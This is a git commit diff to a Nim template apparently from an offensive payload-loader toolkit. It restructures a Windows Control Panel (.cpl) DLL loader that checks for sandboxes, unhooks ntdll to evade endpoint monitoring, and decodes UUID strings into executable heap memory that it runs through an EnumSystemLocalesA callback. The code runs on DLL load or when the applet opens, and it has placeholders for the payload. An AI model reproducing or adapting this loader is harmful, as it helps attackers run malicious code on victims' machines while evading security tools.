586f7a2b1a42d20f44ca40708a1b38a87c875a37
RePRGM <92693582+RePRGM@users.noreply.github.com>
2023-06-12 15:29:45 -0400

    Update simplecpl.nim

--- templates/uuid/simplecpl.nim
+++ templates/uuid/simplecpl.nim
@@ -323,42 +323,6 @@ proc unhook(cleanNtdll: LPVOID): bool =
 proc NimMain() {.cdecl, importc.}
 
 proc execute(): void =
-    const SIZE = REPLACE_ME_SIZE
-    var UUIDARR = allocCStringArray(REPLACE_ME_UUID)
-
-    let hHeap = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE, 0, 0)
-    let ha = HeapAlloc(hHeap, 0, 0x100000)
-    var hptr = cast[DWORD_PTR](ha)
-
-    #[if hptr != 0:
-        echo fmt"[+] Heap Memory is Allocated at 0x{hptr.toHex}"
-    else:
-        echo fmt"[-] Heap Alloc Error "
-        quit(QuitFailure)
-    ]#
-
-    for i in 0..(SIZE-1):
-        var status = UuidFromStringA(cast[RPC_CSTR](UUIDARR[i]), cast[ptr UUID](hptr))
-        if status != RPC_S_OK:
-            if status == RPC_S_INVALID_STRING_UUID:
-                echo fmt"[-] Invalid UUID String"
-            else:
-                echo fmt"[-] Something Went Wrong, Error Code: {status}"
-            quit(QuitFailure)
-        hptr += 16
-
-    EnumSystemLocalesA(cast[LOCALE_ENUMPROCA](ha), 0)
-    CloseHandle(hHeap)
-    quit(QuitSuccess)
-
-proc DllMain(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID) : BOOL {.stdcall, exportc, dynlib.} =
-    #echo "hinstDLL is: ", hinstDLL
-    if fdwReason == DLL_PROCESS_ATTACH:
-        NimMain()
-        currentModule = hinstDLL
-    return true
-
-proc CPlApplet(hwndCpl: HWND, msg: UINT, lParam1: LPARAM, lParam2: LPARAM): LONG {.stdcall, exportc, dynlib.} =
     if sbCheck() >= 2:
         #echo "sbCheck returned true! "
         for i in 1 .. 10000000:
@@ -372,4 +336,41 @@ proc CPlApplet(hwndCpl: HWND, msg: UINT, lParam1: LPARAM, lParam2: LPARAM): LONG
         #echo "getNtdll ran!"
         discard unhook(nt)
         #echo "unhook ran!"
+        const SIZE = REPLACE_ME_SIZE
+        var UUIDARR = allocCStringArray(REPLACE_ME_UUID)
+
+        let hHeap = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE, 0, 0)
+        let ha = HeapAlloc(hHeap, 0, 0x100000)
+        var hptr = cast[DWORD_PTR](ha)
+
+        #[if hptr != 0:
+            echo fmt"[+] Heap Memory is Allocated at 0x{hptr.toHex}"
+        else:
+            echo fmt"[-] Heap Alloc Error "
+            quit(QuitFailure)
+        ]#
+
+        for i in 0..(SIZE-1):
+            var status = UuidFromStringA(cast[RPC_CSTR](UUIDARR[i]), cast[ptr UUID](hptr))
+            if status != RPC_S_OK:
+                if status == RPC_S_INVALID_STRING_UUID:
+                    echo fmt"[-] Invalid UUID String"
+                else:
+                    echo fmt"[-] Something Went Wrong, Error Code: {status}"
+                quit(QuitFailure)
+            hptr += 16
+
+        EnumSystemLocalesA(cast[LOCALE_ENUMPROCA](ha), 0)
+        CloseHandle(hHeap)
+        quit(QuitSuccess)
+
+proc DllMain(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID) : BOOL {.stdcall, exportc, dynlib.} =
+    #echo "hinstDLL is: ", hinstDLL
+    if fdwReason == DLL_PROCESS_ATTACH:
+        NimMain()
+        currentModule = hinstDLL
         execute()
+    return true
+
+proc CPlApplet(hwndCpl: HWND, msg: UINT, lParam1: LPARAM, lParam2: LPARAM): LONG {.stdcall, exportc, dynlib.} =
+    execute()
